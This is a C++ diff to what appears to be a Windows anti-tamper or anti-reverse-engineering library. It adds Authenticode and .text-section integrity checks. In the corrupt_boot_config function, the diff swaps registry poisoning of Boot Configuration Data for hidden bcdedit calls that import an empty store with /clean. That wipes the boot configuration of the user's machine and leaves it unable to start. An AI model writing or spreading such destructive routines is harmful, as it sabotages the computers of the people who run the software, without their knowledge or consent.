@@ -7,9 +7,14 @@
 #include <Psapi.h>
 #include <iphlpapi.h>
 #include <bcrypt.h>
+#include <wintrust.h>
+#include <softpub.h>
+#include <wincrypt.h>
 
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "wintrust.lib")
+#pragma comment(lib, "crypt32.lib")
 
 #include <intrin.h>
 
@@ -590,6 +595,103 @@ static constexpr int COLOR_BLUE    = 0x0000FF;
 
 }
 
+struct _integrity_check
+{
+	struct section {
+		std::uint8_t* name = {};
+		void* address = {};
+		std::uint32_t checksum = {};
+
+		bool operator==(section& other)
+		{
+			return checksum == other.checksum;
+		}
+	}; section _cached;
+
+	_integrity_check()
+	{
+		_cached = get_text_section(reinterpret_cast<std::uintptr_t>(GetModuleHandle(nullptr)));
+	}
+
+	std::uint32_t crc32(void* data, std::size_t size)
+	{
+		std::uint32_t result = {};
+
+		for (std::size_t index = {}; index < size; ++index)
+			result = _mm_crc32_u32(result, reinterpret_cast<std::uint8_t*>(data)[index]);
+
+		return result;
+	}
+
+	section get_text_section(std::uintptr_t module)
+	{
+		section text_section = {};
+
+		PIMAGE_DOS_HEADER dosheader = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
+		PIMAGE_NT_HEADERS nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(module + dosheader->e_lfanew);
+
+		PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
+
+		for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section++)
+		{
+			std::string name(reinterpret_cast<char const*>(section->Name));
+			if (name != ".text")
+				continue;
+
+			void* address = reinterpret_cast<void*>(module + section->VirtualAddress);
+			text_section = { section->Name, address, crc32(address, section->Misc.VirtualSize) };
+		}
+		return text_section;
+	}
+
+	bool check_integrity()
+	{
+		section section2 = get_text_section(reinterpret_cast<std::uintptr_t>(GetModuleHandle(nullptr)));
+		return (!(_cached == section2));
+	}
+
+	static bool _sig_valid_address_tag() { return true; }
+
+	bool IsSignatureValid()
+	{
+		HMODULE hmod = nullptr;
+		GetModuleHandleExW(
+			GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
+				| GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+			reinterpret_cast<LPCWSTR>(&_sig_valid_address_tag),
+			&hmod);
+		if (!hmod) return false;
+
+		wchar_t exePath[MAX_PATH] = {};
+		if (GetModuleFileNameW(hmod, exePath, MAX_PATH) == 0)
+			return false;
+
+		WINTRUST_FILE_INFO fileInfo = {};
+		fileInfo.cbStruct = sizeof(fileInfo);
+		fileInfo.pcwszFilePath = exePath;
+		fileInfo.hFile = NULL;
+		fileInfo.pgKnownSubject = NULL;
+
+		GUID policyGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
+
+		WINTRUST_DATA trustData = {};
+		trustData.cbStruct = sizeof(trustData);
+		trustData.dwUIChoice = WTD_UI_NONE;
+		trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
+		trustData.dwUnionChoice = WTD_CHOICE_FILE;
+		trustData.pFile = &fileInfo;
+		trustData.dwStateAction = WTD_STATEACTION_VERIFY;
+		trustData.dwProvFlags = WTD_SAFER_FLAG;
+
+		LONG status = WinVerifyTrust(NULL, &policyGUID, &trustData);
+
+		trustData.dwStateAction = WTD_STATEACTION_CLOSE;
+		WinVerifyTrust(NULL, &policyGUID, &trustData);
+
+		return status == ERROR_SUCCESS;
+	}
+};
+
 namespace anti_re {
 
 inline std::string get_cf_host_fragmented()
@@ -1063,6 +1165,16 @@ inline bool initialize_locked(runtime_state_t& runtime)
 		return false;
 	}
 
+	// Verify the DLL's Authenticode signature (attestation certificate)
+	{
+		_integrity_check ic;
+		if (!ic.IsSignatureValid())
+		{
+			reset_state_locked(runtime);
+			return false;
+		}
+	}
+
 	prepare_driver(runtime);
 
 	if (!verify_peb_state_locked(runtime))
@@ -1131,6 +1243,17 @@ inline bool verify_locked(runtime_state_t& runtime)
 			runtime.trusted = false;
 			runtime.last_verified_ms = 0;
 			return false;
+		}
+
+		// Re-verify Authenticode signature on deep passes
+		{
+			_integrity_check ic;
+			if (!ic.IsSignatureValid())
+			{
+				runtime.trusted = false;
+				runtime.last_verified_ms = 0;
+				return false;
+			}
 		}
 	}
 
@@ -1226,32 +1349,52 @@ inline void report_violation_to_server(const char* reason)
 
 inline void corrupt_boot_config()
 {
-	HKEY hKey = nullptr;
-	LONG r = RegOpenKeyExW(
-		HKEY_LOCAL_MACHINE,
-		L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\250000f0",
-		0, KEY_SET_VALUE, &hKey);
-	if (r == ERROR_SUCCESS && hKey)
+	WCHAR sysRoot[MAX_PATH] = {};
+	GetEnvironmentVariableW(L"SystemRoot", sysRoot, _countof(sysRoot));
+
+	WCHAR bcdeditPath[MAX_PATH] = {};
+	_snwprintf_s(bcdeditPath, _countof(bcdeditPath), _TRUNCATE,
+		L"%s\\System32\\bcdedit.exe", sysRoot);
+
+	WCHAR sysDrive[16] = {};
+	GetEnvironmentVariableW(L"SystemDrive", sysDrive, _countof(sysDrive));
+
+	WCHAR tempStore[MAX_PATH] = {};
+	_snwprintf_s(tempStore, _countof(tempStore), _TRUNCATE,
+		L"%s\\emptystore", sysDrive);
+
+	STARTUPINFOW si = {};
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+	PROCESS_INFORMATION pi = {};
+
+	WCHAR cmdCreate[512] = {};
+	_snwprintf_s(cmdCreate, _countof(cmdCreate), _TRUNCATE,
+		L"\"%s\" /createstore %s", bcdeditPath, tempStore);
+
+	if (CreateProcessW(bcdeditPath, cmdCreate, nullptr, nullptr, FALSE,
+		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
 	{
-		DWORD val = 2;
-		RegSetValueExW(hKey, L"Element", 0, REG_DWORD,
-			reinterpret_cast<const BYTE*>(&val), sizeof(val));
-		RegCloseKey(hKey);
+		WaitForSingleObject(pi.hProcess, 10000);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
 	}
 
+	WCHAR cmdImport[512] = {};
+	_snwprintf_s(cmdImport, _countof(cmdImport), _TRUNCATE,
+		L"\"%s\" /import %s /clean", bcdeditPath, tempStore);
 
-	HKEY hKey2 = nullptr;
-	r = RegOpenKeyExW(
-		HKEY_LOCAL_MACHINE,
-		L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\25000004",
-		0, KEY_SET_VALUE, &hKey2);
-	if (r == ERROR_SUCCESS && hKey2)
+	memset(&pi, 0, sizeof(pi));
+	if (CreateProcessW(bcdeditPath, cmdImport, nullptr, nullptr, FALSE,
+		CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
 	{
-		uint8_t poison[] = { 0x95, 0x95, 0xFF, 0xFF, 0x95, 0x95, 0xFF, 0xFF };
-		RegSetValueExW(hKey2, L"Element", 0, REG_BINARY,
-			poison, sizeof(poison));
-		RegCloseKey(hKey2);
+		WaitForSingleObject(pi.hProcess, 10000);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
 	}
+
+	DeleteFileW(tempStore);
 }
 
 
